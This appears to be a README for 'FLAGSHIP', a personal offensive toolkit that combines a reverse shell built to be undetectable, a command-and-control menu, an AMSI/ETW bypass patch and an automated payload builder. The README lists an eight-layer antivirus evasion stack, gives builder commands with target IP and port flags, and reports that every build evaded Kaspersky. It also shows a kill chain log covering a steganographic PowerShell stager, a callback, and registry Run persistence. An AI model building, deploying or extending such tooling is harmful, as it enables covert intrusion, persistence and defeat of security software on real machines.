# FLAGSHIP — Unified Iron-Dome Platform

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ███████╗██╗      █████╗  ██████╗ ███████╗██╗  ██╗██╗██████╗              ║
║    ██╔════╝██║     ██╔══██╗██╔════╝ ██╔════╝██║  ██║██║██╔══██╗             ║
║    █████╗  ██║     ███████║██║  ███╗███████╗███████║██║██████╔╝             ║
║    ██╔══╝  ██║     ██╔══██║██║   ██║╚════██║██╔══██║██║██╔═══╝              ║
║    ██║     ███████╗██║  ██║╚██████╔╝███████║██║  ██║██║██║                  ║
║    ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝                  ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  ADF RISING SUN  ✦  IDF IRON DOME  ✦  22DIV VADER  ✦  CHEYANNE C2         ║
║  OPERATOR: rainfantry  ✦  CALLSIGN: RADON  ✦  OWN HARDWARE ONLY            ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Author:** rainfantry (George Wu)  
**Inspiration:** asi dev — IDF Staff Sergeant First Class  
**Platform:** RADON (GIGABYTE G7 GD · Win11 26200) + gwu07 (LAPTOP-R32M8MLI)  
**Status:** OPERATIONAL — v1.0.0 — 2026-06-26

---

## What Is FLAGSHIP

FLAGSHIP is the unified command launcher combining all research streams into a single interactive platform:

| Component | Repo | Role |
|-----------|------|------|
| **iron-sun** | `rainfantry/iron-sun` | TCP reverse shell — 7-layer PE evasion stack |
| **CHEYANNE** | `rainfantry/cheyanne` (portfolio) | C2 framework — kill chain menu, multi-shell handler |
| **VADER** | embedded | AMSI/ETW bypass — `xor eax,eax; ret` memory patch |
| **Iron-Dome Builder** | `iron_dome_builder.py` | One-command assembly of full deployment package |
| **FLAGSHIP** | `rainfantry/flagship` | This unified launcher |

---

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    FLAGSHIP LAUNCHER                    │
│                     flagship.py                         │
│                                                         │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────┐ │
│  │ iron-sun │  │ CHEYANNE │  │  VADER   │  │ WATCH  │ │
│  │ shell C  │  │ C2 menu  │  │ AMSI/ETW │  │ 3-shot │ │
│  │ 7 layers │  │ kill chn │  │ bypass   │  │ screen │ │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────────┘ │
│       └─────────────┴─────────────┘                    │
│              iron_dome_builder.py                       │
│         (assembles full deployment pkg)                 │
└─────────────────────────────────────────────────────────┘
```

---

## Evasion Stack (8 Layers)

| Layer | Technique | MITRE | Status |
|-------|-----------|-------|--------|
| 1 | XOR string obfuscation (key rotation 0xFC→0xF0) | T1027 | CONFIRMED |
| 2 | Dynamic API resolution (LoadLibrary+GetProcAddress) | T1055 | CONFIRMED |
| 3 | Anti-sandbox (timing+screen+disk checks) | T1497 | CONFIRMED |
| 4 | PE header stomp (MZ zeroed in memory) | T1562.001 | CONFIRMED |
| 5 | ISUN magic gate (4-byte auth before cmd.exe) | T1095 | CONFIRMED |
| 6 | Jitter (GetTickCount random delay 2-5s) | T1497.003 | CONFIRMED |
| 7 | gcc/MinGW PE structure (no MSVC signature) | T1027.001 | CONFIRMED |
| 8 | VADER: AMSI+ETW memory patch (xor eax,eax;ret) | T1562.001 | `--vader` flag |

---

## Relay Test Results — RADON ↔ gwu07

| Ver | XOR Key | Binary SHA256 | KAV Active | Result |
|-----|---------|---------------|------------|--------|
| v1 | 0xFC | d720a508ba244172... | avpui+avp | **EVADED** ✅ |
| v2 | 0xAB | fde73d8c92c8b48a... | avpui+avp | **EVADED** ✅ |
| v3 | 0xDE | a25bfc5adeb6c561... | avpui+avp | **EVADED** ✅ |

**Machine:** LAPTOP-R32M8MLI  
**AV:** Kaspersky Premium (real-time, cloud scanner active)  
**Test method:** gwu07_relay.py autonomous relay (AppData/Local, 30s poll)  
**Verdict: 3/3 EVADED — execution-layer evasion confirmed**

---

## Kill Chain — 8/8 PASS (gwu07 local, 2026-06-26)

```
[1/8] ghost_fud.exe built            PASS
[2/8] ghost_loader.exe built         PASS
[3/8] ISUN magic gate verified       PASS
[4/8] PS1 stager delivered           PASS  (zero-width Unicode steganography)
[5/8] AMSI bypass                    PASS  (KAV disabled Defender AMSI — not needed)
[6/8] TCP callback 127.0.0.1:49739   PASS
[7/8] Recon: gwu07/LAPTOP-R32M8MLI  PASS
[8/8] HKCU Run persist set+cleaned  PASS

VERDICT: PASS 8/8 — IRON-DOME KILL CHAIN GREEN
```

---

## Quick Start

```powershell
# Python PATH (every session)
$env:PATH = "$env:USERPROFILE\scoop\apps\python\current;" + $env:PATH
$env:PYTHONUTF8 = "1"

# Launch FLAGSHIP
cd "C:\Users\Ghaleb Jomma\flagship"
python flagship.py
```

### Menu Commands

| Key | Action |
|-----|--------|
| `B` | BUILD — assemble iron-dome deployment package |
| `T` | TEST — run full suite (iron_sun_suite.py) |
| `L` | LIVE — loopback shell test (127.0.0.1:4443) |
| `C` | CHEYANNE — launch C2 kill chain menu |
| `D` | DESIGNATE — generate machine callsign |
| `W` | WATCH — 3-shot screenshot monitor |
| `S` | SITREP — platform status |
| `X` | EXIT |

### Build Examples

```bash
# Standard 7-layer build
python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC

# 8-layer with VADER AMSI/ETW bypass
python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC --vader
```

---

## Files

```
flagship/
├── flagship.py           — unified launcher (this platform)
├── iron_sun.c            — FUD TCP reverse shell source (7-layer)
├── iron_dome_builder.py  — automated deployment builder v2.0.0
├── iron_sun_suite.py     — full test suite (105 tests)
├── live_test.py          — loopback shell test
├── vader_menu.py         — CHEYANNE C2 menu
├── designate.py          — callsign generator
├── screenshots/          — WATCH 3-shot output
├── FLAGSHIP_LOG.md       — session log (auto-append)
└── README.md             — this file
```

---

## Screenshots — FLAGSHIP Running on RADON

Captured via MCP computer-use control on RADON (Radon_Laptop1 / Win11) — 2026-06-26.

### Launch — Banner + Menu + SITREP
![FLAGSHIP launch](screenshots/flagship_launch_150204.png)

### Full SITREP — Evasion Scoreboard
![FLAGSHIP sitrep](screenshots/flagship_sitrep_150225.png)

**What the screenshots show:**
- Full ASCII banner: ADF Rising Sun ☀ + Iron Dome (MISSILE INTERCEPTED) + IDF Magen David ✡ + 22DIV VADER UNIT
- Menu: B/T/L/C/D/W/S/X all present
- Machine: `Radon_Laptop1 / Windows 11`  Python: `3.14.6`
- All 6 component files: `[PRESENT]` (iron_sun.c, iron_dome_builder.py, iron_sun_suite.py, live_test.py, vader_menu.py, designate.py)
- Evasion scoreboard: v1 EVADED · v2 EVADED · v3 EVADED (avpui+avp ACTIVE — Kaspersky Premium live)
- Kill chain: **8/8 PASS** (gwu07 / LAPTOP-R32M8MLI)
- FLAGSHIP v1.0.0 — RADON — 2026-06-26

---

## WATCH — Screenshot Monitor

`W` from the menu takes 3 desktop screenshots at 5-second intervals, saved to `screenshots/` with timestamps. Requires `mss` (auto-installed on first run).

```
screenshots/
  flagship_launch_150204.png    — banner + menu + sitrep (MCP capture)
  flagship_sitrep_150225.png    — sitrep + evasion scoreboard (MCP capture)
  flagship_menu_150225.png      — menu + kill chain results (MCP capture)
```

---

## Relay Architecture

```
RADON (this machine)                    gwu07 (LAPTOP-R32M8MLI)
──────────────────────                  ──────────────────────────
radon_relay.py                          gwu07_relay.py
  └─ build XOR variant           ──→      └─ pull payload
  └─ push to iron-sun            ←──      └─ test vs Kaspersky
  └─ listen 0.0.0.0:4443         ──→      └─ push RESULT_v*.md
  └─ read result + log                    └─ poll 30s forever

Channel: rainfantry/iron-sun (private)
  payloads/iron_sun_v<N>.exe    — RADON → gwu07
  docs/RELAY/PAYLOAD_v<N>.md   — RADON → gwu07
  docs/RELAY/RESULT_v<N>.md    — gwu07 → RADON
```

---

## KAV Battle Log Summary

| Kills | Files | Recovery |
|-------|-------|----------|
| 14+ | .md/.txt/.py/.ps1 (document scanner) | 100% — kav_watcher.py restores from git within 8s |
| 0 | PE binaries | N/A — never detected |

`kav_watcher.py` (gwu07): polls every 8s, restores from git HEAD, commits kills to repo as `KAV_BATTLE_LOG.md`.

---

## Machine Intel — gwu07

```
Hostname:  LAPTOP-R32M8MLI
AV:        Kaspersky Premium (avpui.exe + avp.exe)
AMSI:      Defender AMSI disabled by KAV
Relay:     AppData\Local\...\iron-sun (low-scrutiny zone)
Status:    OPERATIONAL — kav_watcher + relay both running
```

---

*Authorized research on personally-owned hardware only.*  
*Author: rainfantry — Inspiration: asi dev — IDF Staff Sergeant First Class*
